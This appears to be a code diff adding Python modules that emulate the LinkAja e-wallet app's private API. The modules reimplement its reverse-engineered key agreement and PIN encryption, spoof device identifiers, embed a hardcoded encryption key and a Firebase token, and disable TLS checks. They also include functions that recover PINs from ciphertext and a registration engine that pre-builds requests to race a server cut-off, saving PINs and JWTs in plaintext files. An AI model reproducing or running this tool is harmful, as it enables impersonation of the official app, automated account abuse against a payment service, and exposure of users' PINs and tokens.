+        "jid": rand_jid(),
+        "fid": fid,
+        "fid_token": fid_token,
+        "devicemodel": dev["devicemodel"],
+        "osversion": dev["osversion"],
+        "osname": dev["osname"],
+        "brand": dev["brand"]
+    }
+
+
+# ============================================================
+# MODUL INTEGRASI 3: DIFFIE-HELLMAN KEY AGREEMENT
+# ============================================================
+
+#!/usr/bin/env python3
+"""
+keyagreement.py — KeyAgreement LinkAja (DH klasik, pure python).
+
+
+DH (Diffie-Hellman) klasik:
+  P = 3072-bit MODP prime (RFC 3526 group 15)
+  g = 2
+  privateKey = BigInteger(1, SecureRandom(400 bytes))          # 400 byte
+  publicKey  = (g ^ priv) mod P   -> hex -> pad "0" ke 768
+  sharedKey  = (peerPub ^ priv) mod P -> hex -> pad "0" ke 768
+
+Flow:
+  1. getKey() -> {Krisna, Endhy, Rilvi} = 3 private key (hex)
+  2. getPublicKey(privKey) -> {Krisna,Endhy,Rilvi} = 3 public key (hex 768)
+  3. POST echo {Krisna,Endhy,Rilvi} -> server {x1,x2,x3} (public key server)
+  4. getSharedKey(privKey, serverKey) -> {k1,k2,k3} = 768-hex shared secret
+  5. k1/k2/k3 dipakai di ExternalFun.encryptJson
+"""
+
+
+# prime DH standar (RFC 3526, 1536-bit)
+P_HEX = ("FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AAAC42DAD33170D04507A33A85521ABDF1CBA64ECFB850458DBEF0A8AEA71575D060C7DB3970F85A6E1E4C7ABF5AE8CDB0933D71E8C94E04A25619DCEE3D2261AD2EE6BF12FFA06D98A0864D87602733EC86A64521F2B18177B200CBBE117577A615D6C770988C0BAD946E208E24FA074E5AB3143DB5BFCE0FD108E4B82D120A93AD2CAFFFFFFFFFFFFFFFF")
+P = int(P_HEX, 16)
+G = 2
+HEX_LEN = 768          # DEFAULT_LENGTH_HEX
+PRIV_BYTES = 400       # 0x190
+
+
+def _pad(hexstr: str, n: int = HEX_LEN) -> str:
+    """formatHexString: pad kiri pakai '0' sampai panjang n."""
+    if len(hexstr) < n:
+        hexstr = "0" * (n - len(hexstr)) + hexstr
+    return hexstr
+
+
+def generate_private_key() -> str:
+    """BigInteger(1, SecureRandom(400 bytes)).toString(16)."""
+    b = secrets.token_bytes(PRIV_BYTES)
+    v = int.from_bytes(b, "big")           # sign=1, big-endian
+    return format(v, "x")
+
+
+def generate_public_key(priv_hex: str) -> str:
+    """(g ^ priv) mod P -> hex -> pad 768."""
+    priv = int(priv_hex, 16)
+    pub = pow(G, priv, P)
+    return _pad(format(pub, "x"))
+
+
+def generate_shared_key(priv_hex: str, peer_pub_hex: str) -> str:
+    """(peerPub ^ priv) mod P -> hex -> pad 768."""
+    priv = int(priv_hex, 16)
+    peer = int(peer_pub_hex, 16)
+    shared = pow(peer, priv, P)
+    return _pad(format(shared, "x"))
+
+
+def get_key() -> dict:
+    """3 private key baru."""
+    return {
+        "key1": generate_private_key(),
+        "key2": generate_private_key(),
+        "key3": generate_private_key(),
+    }
+
+
+def get_public_key(priv: dict) -> dict:
+    return {
+        "key1": generate_public_key(priv["key1"]),
+        "key2": generate_public_key(priv["key2"]),
+        "key3": generate_public_key(priv["key3"]),
+    }
+
+
+def get_shared_key(priv: dict, server_pub: dict) -> dict:
+    """priv = private lokal; server_pub = x1/x2/x3 dari server."""
+    return {
+        "key1": generate_shared_key(priv["key1"], server_pub["key1"]),
+        "key2": generate_shared_key(priv["key2"], server_pub["key2"]),
+        "key3": generate_shared_key(priv["key3"], server_pub["key3"]),
+    }
+
+
+
+get_dh_key = get_key
+get_dh_public_key = get_public_key
+get_dh_shared_key = get_shared_key
+
+
+# ============================================================
+# MODUL INTEGRASI 4: PIN CRYPTO (XOR MASK + AES-CBC)
+# ============================================================
+
+#!/usr/bin/env python3.12
+"""
+pin_crypto.py — Replikasi Python encryptPlainText() LinkAja (com.telkom.mwallet).
+Model final, teruji luas.
+
+ALGORITMA FINAL:
+  salt_str = to_string(rand() % 9000 + 1000)   # 4 digit ASCII "1000".."9999"
+  S        = salt_str + pin + arg3             # arg3 = timestamp (epoch ms string)
+  body[k]  = ord(S[k]) ^ ord(S[k+10])   jika k < 12 DAN k+10 < len(S)
+             ord(S[k])                  selain itu
+  data     = body + PKCS#7 pad ke kelipatan 16
+  ct       = AES-256-CBC(key=ascii(key)[:32].ljust(32, b'\\0'), IV=b'\\0'*16, data)
+  ret      = base64(ct)
+
+CATATAN PENTING:
+  - 4 byte pertama plaintext hasil decrypt BUKAN salt mentah — itu
+    salt_str XOR arg3[0:4]. Kembalikan dgn recover_salt_str().
+  - XOR-nya full-ASCII (bukan digit-value); utk pasangan digit hasilnya sama
+    dgn XOR nibble, tapi utk arg3 hex (self-call path) wajib ASCII.
+  - Window XOR: partner = posisi+10, aktif utk k <= 15 (16 posisi pertama) dan
+    hanya jika partner masih ada di dalam S.
+  -"3B mystery 01 07 05" pada ts 13 digit = XOR ts[0],ts[1] dgn ts[10],ts[11]:
+    '1'^'0'=0x01, '7'^'7'=0x00, '5'^'5'=0x00 ... (pasangan digit-sama -> 0).
+"""
+
+
+
+
+
+
+BLOCK = 16
+
+
+def _transform(S: str) -> bytes:
+    """body[k] = ord(S[k]) ^ ord(S[k+10]) utk k<=15 & k+10<len(S); else ord(S[k]).
+
+    Window k<=15 terverifikasi: self-call (len 42) -> XOR aktif k=0..15,
+    tslen13 (len 23) -> aktif k=0..12 (partner OOB mulai k=13)."""
+    n = len(S)
+    out = bytearray()
+    for k in range(n):
+        if k < 16 and k + 10 < n:
+            out.append((ord(S[k]) ^ ord(S[k + 10])) & 0xFF)
+        else:
+            out.append(ord(S[k]))
+    return bytes(out)
+
+
+def encrypt_plain_text(pin: str, key: str, ts: str, salt_str: str | None = None) -> str:
+    """Replikasi native module.libraries.coresec.ExternalFun.encryptPlainText.
+    salt_str bisa di-inject utk determinism test."""
+    s = salt_str if salt_str is not None else str(random.randint(1000, 9999))
+    assert len(s) == 4 and s.isdigit(), "salt_str harus 4 digit"
+    data = _transform(s + pin + ts)
+    pad = BLOCK - (len(data) % BLOCK)
+    data += bytes([pad]) * pad
+    key32 = key.encode("utf-8")[:32].ljust(32, b"\x00")
+    ct = AES.new(key32, AES.MODE_CBC, b"\x00" * BLOCK).encrypt(data)
+    return base64.b64encode(ct).decode()
+
+
+def decrypt_cipher_text(b64: str, key: str) -> bytes:
+    """Decrypt output (body + PKCS7) -> unpad. Return full pt (salt-masked)."""
+    key32 = key.encode("utf-8")[:32].ljust(32, b"\x00")
+    pt = AES.new(key32, AES.MODE_CBC, b"\x00" * BLOCK).decrypt(base64.b64decode(b64))
+    pad = pt[-1]
+    if 1 <= pad <= BLOCK and pt[-pad:] == bytes([pad]) * pad:
+        pt = pt[:-pad]
+    return pt
+
+
+def recover_salt_str(pt: bytes, arg3: str) -> str:
+    """salt_str[k] = chr(pt[k] ^ ord(arg3[k])). Harus 4 digit '1000'-'9999'."""
+    raw = bytes((pt[k] ^ ord(arg3[k])) & 0xFF for k in range(4))
+    return raw.decode("latin1")
+
+
+def extract_pin(pt: bytes, arg3: str, pin_len: int = 6) -> str:
+    """Ekstrak pin dari pt (model S = salt4+pin+arg3).
+    Region pin: k=4..9; partner S[k+10] = arg3[k] (karena S[10+m]=arg3[m])."""
+    out = []
+    for k in range(4, 4 + pin_len):
+        p = k + 10
+        if p < 4 + 6 + len(arg3):
+            a = arg3[k]  # S[k+10] = arg3[(k+10)-10] = arg3[k]
+            out.append(chr(0x30 + ((pt[k] ^ ord(a)) & 0x0F)))
+        else:
+            out.append(chr(pt[k]))
+    return "".join(out)
+
+
+class df:
+    SECRET = SECRET
+    UID_MAC = UID_MAC
+    GK_FALLBACK = GK_FALLBACK
+    get_key = staticmethod(get_key)
+    encrypt_body = staticmethod(encrypt_body)
+    encrypt_request_payload = staticmethod(encrypt_request_payload)
+    calc_raw = staticmethod(calc_raw)
+    raw_for_get = staticmethod(raw_for_get)
+    raw_for_post = staticmethod(raw_for_post)
+    decrypt_body = staticmethod(decrypt_body)
+
+class pin_crypto:
+    encrypt_plain_text = staticmethod(encrypt_plain_text)
+    decrypt_cipher_text = staticmethod(decrypt_cipher_text)
+    recover_salt_str = staticmethod(recover_salt_str)
+    extract_pin = staticmethod(extract_pin)
+
+
+
+# ============================================================
+# MODUL INTEGRASI 5: LINKAJA SESSION & CONNECTION POOL
+# ============================================================
+
+#!/usr/bin/env python3
+"""session.py — LinkAja API session: key agreement + request signing.
+
+Flow: identity → DH key exchange → session keys (k1/k2/k3) → API call.
+"""
+import json, time, warnings, sys, os, pathlib
+warnings.filterwarnings("ignore")
+import httpx
+
+
+
+BASE = "https://avengers.linkaja.com/v2/api"
+VER = "4.46.1"
+
+# data dir portable (Windows/Linux/Termux): <root>/data/ sejajar core/
+ROOT = pathlib.Path(__file__).resolve().parent
+DATA = ROOT / "data"
+STATES = DATA / "states"
+DATA.mkdir(parents=True, exist_ok=True)
+STATES.mkdir(parents=True, exist_ok=True)
+
+_FIS_FILE = DATA / "fis.json"
+FID_TOKEN = "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhcHBJZCI6IjE6ODkxNjUxMjA4MjkzOmFuZHJvaWQ6ZDYyZjgyY2Y3NTllYjRmNCIsImV4cCI6MTc5MTgyOTk0MywiZmlkIjoiY1Azbm1VOW4telNVLTVQQUp0RDVBSCIsInByb2plY3ROdW1iZXIiOjg5MTY1MTIwODI5M30.AB2LPV8wRQIhAK3dEEtmGuRW5il_751LCfalD4--CbsamMIedF2dfUX1AiALJ-uPLjTox79Kzkh0L4s1c8Peh666YixMPWBB7FYrkA"
+if _FIS_FILE.exists():
+    try:
+        fis = json.loads(_FIS_FILE.read_text(encoding="utf-8"))
+        FID_TOKEN = fis.get("authToken", {}).get("token", FID_TOKEN)
+    except Exception:
+        pass
+
+dh_privkeys = get_dh_key
+get_public_key = get_dh_public_key
+
+
+class SessionError(Exception):
+    """Exception dasar untuk error session HTTP."""
+    pass
+
+
+class SessionTimeoutError(SessionError):
+    """Exception saat koneksi/read mengalami timeout setelah batas retry tercapai."""
+    pass
+
+
+_LIMITS = httpx.Limits(max_keepalive_connections=50, max_connections=100, keepalive_expiry=60.0)
+_TIMEOUT = httpx.Timeout(connect=15.0, read=30.0, write=15.0, pool=10.0)
+_CLIENT = httpx.Client(verify=False, timeout=_TIMEOUT, limits=_LIMITS)
+
+
+def robust_request(method: str, url: str, max_retries: int = 3, backoff: float = 0.5, **kwargs) -> httpx.Response:
+    """Mengirim request HTTP dengan penanganan ReadTimeout, ConnectTimeout, dan auto-retry otomatis."""
+    last_err = None
+    for attempt in range(1, max_retries + 1):
+        try:
+            return _CLIENT.request(method, url, **kwargs)
+        except (httpx.ReadTimeout, httpx.ConnectTimeout, httpx.TimeoutException) as exc:
+            last_err = exc
+            if attempt < max_retries:
+                time.sleep(backoff * attempt)
+                continue
+            break
+        except (httpx.ConnectError, httpx.NetworkError, httpx.RemoteProtocolError) as exc:
+            last_err = exc
+            if attempt < max_retries:
+                time.sleep(backoff * attempt)
+                continue
+            break
+        except Exception as exc:
+            raise exc
+
+    raise SessionTimeoutError(
+        f"Koneksi timeout ({type(last_err).__name__}) ke {url} setelah {max_retries}x percobaan"
+    ) from last_err
+
+
+def prime_connection() -> float:
+    """Priming/warm-up socket TCP dan TLS session ke LinkAja API menggunakan request OPTIONS ringan."""
+    try:
+        t0 = time.perf_counter()
+        _CLIENT.options(f"{BASE}/onboard/check")
+        return (time.perf_counter() - t0) * 1000
+    except Exception:
+        return -1.0
+
+
+def prime_connection_pool(concurrency: int = 10) -> int:
+    """Membuka N soket TCP/TLS secara serentak di connection pool (timeout ketat non-blocking)."""
+    import concurrent.futures
+    count = 0
+    def _warm():
+        nonlocal count
+        try:
+            _CLIENT.options(f"{BASE}/onboard/check", timeout=1.5)
+            count += 1
+        except Exception:
+            pass
+    try:
+        workers = min(max(concurrency, 1), 50)
+        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
+            futures = [ex.submit(_warm) for _ in range(workers)]
+            concurrent.futures.wait(futures, timeout=2.0)
+        return count
+    except Exception:
+        return 0
+
+
+def state_path(msisdn) -> pathlib.Path:
+    return STATES / f"state_{msisdn}.json"
+
+
+def save_state(msisdn, sess, refid=None, jwt=None, refreshToken=None):
+    """Simpan/perbarui state akun (identity + session keys + refId + JWT)."""
+    ident, shared = sess
+    p = state_path(msisdn)
+    old = {}
+    if p.exists():
+        try:
+            old = json.loads(p.read_text())
+            if not isinstance(old, dict):
+                old = {}
+        except Exception:
+            old = {}
+    old.update({"ident": ident, "shared": shared, "created": time.time()})
+    if refid:
+        old["refId"] = refid
+    if jwt:
+        old["jwt"] = jwt
+    if refreshToken:
+        old["refreshToken"] = refreshToken
+    p.write_text(json.dumps(old, ensure_ascii=False, indent=2))
+    return old
+
+
+def save_full_account_state(msisdn, sess, jwt, refreshToken, fullname, email, pin, customerId):
+    """Simpan seluruh metadata akun dalam 1x I/O disk."""
+    ident, shared = sess
+    p = state_path(msisdn)
+    old = {}
+    if p.exists():
+        try:
+            old = json.loads(p.read_text())
+            if not isinstance(old, dict):
+                old = {}
+        except Exception:
+            old = {}
+    old.update({
+        "ident": ident,
+        "shared": shared,
+        "created": time.time(),
+        "jwt": jwt,
+        "refreshToken": refreshToken,
+        "fullname": fullname,
+        "email": email,
+        "pin": pin,
+        "customerId": customerId,
+        "msisdn": msisdn
+    })
+    p.write_text(json.dumps(old, ensure_ascii=False, indent=2))
+    return old
+
+
+def defer_save_account(msisdn, sess, jwt, refreshToken, fullname, email, pin, customerId):
+    """Penyimpanan state akun di background thread (non-blocking)."""
+    import threading
+    t = threading.Thread(
+        target=save_full_account_state,
+        args=(msisdn, sess, jwt, refreshToken, fullname, email, pin, customerId),
+        daemon=False
+    )
+    t.start()
+    return t
+
+
+def load_state(msisdn, max_age=7 * 86400) -> dict | None:
+    p = state_path(msisdn)
+    if p.exists():
+        try:
+            st = json.loads(p.read_text())
+        except Exception:
+            return None
+        if time.time() - st.get("created", 0) > max_age:
+            return None
+        return st
+    return None
+
+
+def list_states() -> list[dict]:
+    out = []
+    for p in sorted(STATES.glob("state_*.json")):
+        try:
+            st = json.loads(p.read_text())
+            ms = p.stem.replace("state_", "")
+            out.append({"msisdn": ms, "fullname": st.get("fullname", ""),
+                        "jwt": st.get("jwt", ""),
+                        "file": str(p)})
+        except Exception:
+            pass
+    return out
+
+
+def key_agreement(max_retries: int = 3):
+    for attempt in range(1, max_retries + 1):
+        ident = new_identity()
+        did, imsi = ident["deviceId"], ident["imsi"]
+        fid_tok = ident.get("fid_token") or FID_TOKEN
+        dmodel = ident.get("devicemodel") or "XIAOMI Redmi Note 5"
+        osver = ident.get("osversion") or "13"
+        osnm = ident.get("osname") or "Android"
+        priv = dh_privkeys()
+        pub = get_public_key(priv)
+        payload = json.dumps({"Krisna": pub["key1"], "Endhy": pub["key2"],
+                              "Rilvi": pub["key3"]}, separators=(',', ':'))
+        ts = str(int(time.time() * 1000))
+        enc = lambda m: df.encrypt_body(ts, did, imsi, m, k3="", gk=df.GK_FALLBACK)
+        send = json.dumps({"putu": enc(payload), "tayo": enc(payload + df.SECRET),
+                           "thomas": enc("7744" + payload + ts)}, separators=(',', ':'))
+        raw = df.calc_raw(ts, did, imsi, send + ts + df.UID_MAC, k1="", gk=df.GK_FALLBACK)
+        H = {"accept-language": "ID", "pushid": "", "jid": ident["jid"],
+             "adsid": ident["adsId"], "longitude": "-1.0", "latitude": "-1.0",
+             "fid": fid_tok, "osname": osnm, "osversion": osver,
+             "appversion": VER, "devicemodel": dmodel,
+             "accept": "application/json", "deviceid": did, "imsi": imsi,
+             "content-type": "application/json; charset=UTF-8",
+             "timestamp": ts, "raw": raw, "errorcode": "",
+             "authorization": "Bearer", "user-agent": "okhttp/4.11.0",
+             "accept-encoding": "gzip"}
+        try:
+            r = robust_request("POST", f"{BASE}/echo", content=send, headers=H, max_retries=2)
+            assert r.status_code == 200, f"echo {r.status_code}: {r.text[:120]}"
+            resp = json.loads(r.text)
+            shared = {"key1": generate_shared_key(priv["key1"], resp["data"]["x1"]),
+                      "key2": generate_shared_key(priv["key2"], resp["data"]["x2"]),
+                      "key3": generate_shared_key(priv["key3"], resp["data"]["x3"])}
+            return ident, shared
+        except Exception as exc:
+            if attempt < max_retries:
+                time.sleep(0.5 * attempt)
+                continue
+            raise SessionTimeoutError(f"Key agreement /echo gagal setelah {max_retries}x percobaan: {exc}") from exc
+
+
+def decrypt_resp(r, st):
+    """Response decrypt: gk=getKey(k1), ts = response header timestamp."""
+    import base64
+    from Crypto.Cipher import AES
+    body = r.text.strip()
+    if body.startswith("{"):
+        return json.loads(body)
+    ident, shared = st["ident"], st["shared"]
+    did, imsi = ident["deviceId"], ident["imsi"]
+    rts = r.headers.get("timestamp", "")
+    gk = df.get_key(shared["key1"], VER)
+    _xr = lambda d, k: bytes(d[i] ^ k[i % len(k)] for i in range(len(d)))
+    _mask = lambda b: bytes(((x & 0x3f) << 2) & 0xff for x in b)
+    se2 = _xr(imsi.encode() + gk.encode(), (did + rts).encode())
+    key32 = _mask(se2)
+    se3 = _xr(rts.encode(), gk.encode())
+    iv = (_mask(se3) + b"\x00" * 16)[:16]
+    pt = AES.new(key32, AES.MODE_CBC, iv).decrypt(base64.b64decode(body))
+    n = pt[-1] if pt[-1] <= 16 else 0
+    return json.loads(pt[:len(pt) - n].decode())
+
+
+def api_post(sess, path, payload_dict, token="Bearer", ts=None, extra_headers=None, max_retries=3):
+    ident, shared = sess
+    did, imsi = ident["deviceId"], ident["imsi"]
+    fid_tok = ident.get("fid_token") or FID_TOKEN
+    dmodel = ident.get("devicemodel") or "XIAOMI Redmi Note 5"
+    osver = ident.get("osversion") or "13"
+    osnm = ident.get("osname") or "Android"
+    payload = json.dumps(payload_dict, separators=(',', ':'))
+    ts = ts or str(int(time.time() * 1000))
+    enc = lambda m: df.encrypt_body(ts, did, imsi, m, k3=shared["key3"])
+    send = json.dumps({"putu": enc(payload), "tayo": enc(payload + df.SECRET),
+                       "thomas": enc("7744" + payload + ts)}, separators=(',', ':'))
+    raw = df.calc_raw(ts, did, imsi, send + ts + df.UID_MAC, k1=shared["key1"])
+    H = {"accept-language": "ID", "pushid": "", "jid": ident["jid"],
+         "adsid": ident["adsId"], "longitude": "-1.0", "latitude": "-1.0",
+         "fid": fid_tok, "osname": osnm, "osversion": osver,
+         "appversion": VER, "devicemodel": dmodel,
+         "accept": "application/json", "deviceid": did, "imsi": imsi,
+         "content-type": "application/json; charset=UTF-8",
+         "timestamp": ts, "raw": raw, "errorcode": "",
+         "authorization": token, "user-agent": "okhttp/4.11.0",
+         "accept-encoding": "gzip"}
+    if extra_headers:
+        H.update(extra_headers)
+    return robust_request("POST", BASE + path, content=send, headers=H, max_retries=max_retries)
+
+
+def api_get(sess, path, token="Bearer", max_retries=3):
+    ident, shared = sess
+    did, imsi = ident["deviceId"], ident["imsi"]
+    fid_tok = ident.get("fid_token") or FID_TOKEN
+    dmodel = ident.get("devicemodel") or "XIAOMI Redmi Note 5"
+    osver = ident.get("osversion") or "13"
+    osnm = ident.get("osname") or "Android"
+    ts = str(int(time.time() * 1000))
+    raw = df.calc_raw(ts, did, imsi, ts + df.UID_MAC, k1=shared["key1"])
+    H = {"accept-language": "ID", "pushid": "", "jid": ident["jid"],
+         "adsid": ident["adsId"], "longitude": "-1.0", "latitude": "-1.0",
+         "fid": fid_tok, "osname": osnm, "osversion": osver,
+         "appversion": VER, "devicemodel": dmodel,
+         "accept": "application/json", "deviceid": did, "imsi": imsi,
+         "timestamp": ts, "raw": raw, "errorcode": "",
+         "authorization": token, "user-agent": "okhttp/4.11.0",
+         "accept-encoding": "gzip"}
+    return robust_request("GET", BASE + path, headers=H, max_retries=max_retries)
+
+
+class session:
+    VER = VER
+    BASE = BASE
+    FID_TOKEN = FID_TOKEN
+    DATA = DATA
+    STATES = STATES
+    _CLIENT = _CLIENT
+    prime_connection = staticmethod(prime_connection)
+    prime_connection_pool = staticmethod(prime_connection_pool)
+    state_path = staticmethod(state_path)
+    save_state = staticmethod(save_state)
+    save_full_account_state = staticmethod(save_full_account_state)
+    defer_save_account = staticmethod(defer_save_account)
+    load_state = staticmethod(load_state)
+    list_states = staticmethod(list_states)
+    key_agreement = staticmethod(key_agreement)
+    decrypt_resp = staticmethod(decrypt_resp)
+    robust_request = staticmethod(robust_request)
+    api_post = staticmethod(api_post)
+    api_get = staticmethod(api_get)
+    SessionError = SessionError
+    SessionTimeoutError = SessionTimeoutError
+
+
+
+# ============================================================
+# MODUL INTEGRASI 6: REGISTRATION ENGINE
+# ============================================================
+
+"""regis.py — flow pendaftaran akun LinkAja (input manual, OTP via SMS).
+
+Tahap:
+  1. onboard/check → cek nomor
+  2. /otp (onboarding) → SMS OTP ke nomor user; refId disimpan
+  3. validate-check (OTP dari user)
+  4. register (nama + email + PIN) — harus ≤60 dtk setelah validate
+  5. state disimpan (identity + session keys + JWT)
+"""
+
+
+
+
+
+
+
+
+
+TNC = "17 Februari 2025"
+ENC_KEY = "DN$F#hwNk7TJWhu+ptF#f8bNTCASH"
+
+
+class RegisError(Exception):
+    """Error user-friendly (message-nya langsung bisa ditampilkan)."""
+
+
+def normalize_msisdn(raw: str) -> str:
+    """62812xxxx / 0812xxxx / +62812xxxx → 62812xxxx."""
+    m = (raw or "").strip().lstrip("+").replace(" ", "").replace("-", "")
+    if m.startswith("0"):
+        m = "62" + m[1:]
+    if not (m.startswith("62") and m[8:].isdigit() and 10 <= len(m) <= 15):
+        raise RegisError("Nomor HP gak valid. Contoh: 08123456789")
+    return m
+
+
+def step_check(msisdn):
+    """Cek nomor di server. Return (sudah_terdaftar: bool, pesan)."""
+    st = load_state(msisdn, max_age=365 * 86400)
+    if not st:
+        st = _new_state(msisdn)
+    try:
+        r = api_post(_sess(st), "/onboard/check", {"msisdn": msisdn})
+    except (SessionTimeoutError, httpx.TimeoutException, httpx.RequestError) as exc:
+        raise RegisError(f"Timeout cek nomor: server tidak merespons ({exc})") from exc
+    j = decrypt_resp(r, st) if r.status_code == 200 else {}
+    status = j.get("status", "")
+    msg = j.get("message", "")
+    low = (msg or "").lower()
+    # 10010004: "Nomor Anda sudah terdaftar" -> tolak
+    # 10010005: "Anda belum terdaftar" -> fresh
+    # 10010019: "Nomor HP tidak dapat digunakan" (belum terdaftar di auth flow) -> fresh
+    already_registered = (status == "10010004" or ("terdaftar" in low and "belum" not in low))
+    return already_registered, f"{status} | {msg}"
+
+
+def step_send_otp(msisdn, sess=None):
+    """Kirim SMS OTP ke nomor user. Return refId (disimpan di state)."""
+    st = load_state(msisdn, max_age=365 * 86400)
+    try:
+        if sess is None:
+            sess = key_agreement()          # OTP selalu session fresh
+        st = _ensure_state(msisdn, sess)
+        r = api_post(sess, "/onboard/check", {"msisdn": msisdn})
+        r = api_post(sess, "/otp", {"msisdn": msisdn, "type": "onboarding"})
+    except (SessionTimeoutError, httpx.TimeoutException, httpx.RequestError) as exc:
+        raise RegisError(f"Timeout kirim OTP: server tidak merespons ({exc})") from exc
+    if r.status_code != 200:
+        raise RegisError(f"Server nolak kirim OTP (HTTP {r.status_code})")
+    j = decrypt_resp(r, _st_of(sess))
+    refid = j.get("refId") or j.get("data", {}).get("refId")
+    if not refid:
+        raise RegisError("Server gak kasih refId — coba lagi")
+    save_state(msisdn, sess, refid=refid)
+    return refid
+
+
+def step_validate(msisdn, otp: str) -> dict:
+    """Validasi OTP user → state SIGNUP. Raise RegisError kalau salah."""
+    otp_clean = "".join(filter(str.isdigit, str(otp)))
+    if len(otp_clean) == 6:
+        otp = otp_clean
+    st = load_state(msisdn, max_age=365 * 86400)
+    if not st or not st.get("refId"):
+        raise RegisError("Ga ada sesi OTP aktif — mulai daftar lagi")
+    try:
+        r = api_post(_sess(st), "/onboard/validate-check",
+                     {"msisdn": msisdn, "otp": otp, "refId": st["refId"]})
+    except (SessionTimeoutError, httpx.TimeoutException, httpx.RequestError) as exc:
+        raise RegisError(f"Timeout validasi OTP: server tidak merespons ({exc})") from exc
+    j = decrypt_resp(r, st) if r.status_code == 200 else {}
+    d = j.get("data", {}) if isinstance(j.get("data"), dict) else {}
+    state = d.get("state", "")
+    if state != "SIGNUP":
+        if state == "LOGIN":
+            raise RegisError("Nomor Daur Ulang (Akun Lama Terdaftar)")
+        raise RegisError(f"OTP ditolak: status={j.get('status')}, state={state or '-'}")
+    return j
+
+
+class PrebuiltRegisterPayload:
+    """Kontainer paket pendaftaran yang sudah di-pre-build (terenkripsi penuh) di memory."""
+    def __init__(self, msisdn, sess, st, url, content, headers, fullname, email, pin, ts):
+        self.msisdn = msisdn
+        self.sess = sess
+        self.st = st
+        self.url = url
+        self.content = content
+        self.headers = headers
+        self.fullname = fullname
+        self.email = email
+        self.pin = pin
+        self.ts = ts
+
+
+def prepare_register_payload(msisdn, pin, fullname, email, target_ts=None, st=None) -> PrebuiltRegisterPayload:
+    """Pre-compute & build seluruh payload pendaftaran sebelum jam cut-off.
+    
+    Menyelesaikan seluruh hashing (SHA-256), enkripsi PIN, 3x AES Body,
+    dan HMAC-SHA512 di memory sebelum trigger pengiriman.
+    """
+    if st is None:
+        st = load_state(msisdn, max_age=365 * 86400)
+    if not st or not st.get("refId"):
+        raise RegisError("Ga ada sesi validate aktif — mulai daftar lagi")
+    
+    sess = _sess(st)
+    ident, shared = sess
+    did, imsi = ident["deviceId"], ident["imsi"]
+    
+    ts = str(int(target_ts)) if target_ts else str(int(time.time() * 1000))
+    key32 = hashlib.sha256(ENC_KEY.encode()).hexdigest()[:32]
+    pin_enc = pin_crypto.encrypt_plain_text(pin, key32, ts)
+    
+    body = {
+        "email": email, "fullName": fullname, "msisdn": msisdn,
+        "pushId": "", "pin": pin_enc, "sharia": False, "tncVersion": TNC
+    }
+    payload_json = json.dumps(body, separators=(',', ':'))
+    
+    # Pre-cache deterministik get_key agar tidak dihitung ulang berkali-kali
+    gk_k3 = df.get_key(shared["key3"], VER)
+    gk_k1 = df.get_key(shared["key1"], VER)
+    
+    enc = lambda m: df.encrypt_body(ts, did, imsi, m, k3=shared["key3"], ver=VER, gk=gk_k3)
+    send = json.dumps({
+        "putu": enc(payload_json),
+        "tayo": enc(payload_json + df.SECRET),
+        "thomas": enc("7744" + payload_json + ts)
+    }, separators=(',', ':'))
+    
+    raw = df.calc_raw(ts, did, imsi, send + ts + df.UID_MAC, k1=shared["key1"], ver=VER, gk=gk_k1)
+    
+    fid_tok = ident.get("fid_token") or FID_TOKEN
+    dmodel = ident.get("devicemodel") or "XIAOMI Redmi Note 5"
+    osver = ident.get("osversion") or "13"
+    osnm = ident.get("osname") or "Android"
+
+    headers = {
+        "accept-language": "ID", "pushid": "", "jid": ident["jid"],
+        "adsid": ident["adsId"], "longitude": "-1.0", "latitude": "-1.0",
+        "fid": fid_tok, "osname": osnm, "osversion": osver,
+        "appversion": VER, "devicemodel": dmodel,
+        "accept": "application/json", "deviceid": did, "imsi": imsi,
+        "content-type": "application/json; charset=UTF-8",
+        "timestamp": ts, "raw": raw, "errorcode": "",
+        "authorization": "Bearer", "user-agent": "okhttp/4.11.0",
+        "accept-encoding": "gzip",
+        "x-koya-geheim": ts
+    }
+    url = f"{BASE}/onboard/register"
+    
+    return PrebuiltRegisterPayload(
+        msisdn=msisdn,
+        sess=sess,
+        st=st,
+        url=url,
+        content=send,
+        headers=headers,
+        fullname=fullname,
+        email=email,
+        pin=pin,
+        ts=ts
+    )
+
+
+def execute_register_payload(prebuilt: PrebuiltRegisterPayload, async_save=True, timeout=30.0) -> tuple[dict, float]:
+    """Menembak request pendaftaran pre-built secara instan (0 overhead enkripsi/persiapan).
+    
+    Returns: (data_dict, latency_network_ms)
+    """
+    t0 = time.perf_counter()
+    try:
+        # Gunakan timeout 10.0s agar tidak terputus saat server LinkAja antre antrean war
+        r = _CLIENT.post(prebuilt.url, content=prebuilt.content, headers=prebuilt.headers, timeout=timeout)
+    except (httpx.TimeoutException, httpx.RequestError) as exc:
+        raise RegisError(f"Register timeout / koneksi terputus: {exc}") from exc
+    rtt_ms = (time.perf_counter() - t0) * 1000
+    
+    j = decrypt_resp(r, prebuilt.st) if r.status_code == 200 else {}
+    if j.get("status") not in ("00", "10010201"):
+        raise RegisError(f"Register gagal: {j.get('message') or j.get('status')}")
+    
+    d = j.get("data", {})
+    jwt = d.get("auth")
+    refresh_token = d.get("refreshToken")
+    customer_id = d.get("customerId")
+    
+    if async_save:
+        defer_save_account(
+            prebuilt.msisdn, prebuilt.sess, jwt, refresh_token,
+            prebuilt.fullname, prebuilt.email, prebuilt.pin, customer_id
+        )
+    else:
+        save_full_account_state(
+            prebuilt.msisdn, prebuilt.sess, jwt, refresh_token,
+            prebuilt.fullname, prebuilt.email, prebuilt.pin, customer_id
+        )
+        
+    return d, rtt_ms
+
+
+def step_register(msisdn, pin, fullname, email) -> dict:
+    """Setor nama+email+PIN → akun jadi. Wajib ≤60 dtk setelah validate."""
+    prebuilt = prepare_register_payload(msisdn, pin, fullname, email)
+    d, _ = execute_register_payload(prebuilt, async_save=True)
+    return d
+
+
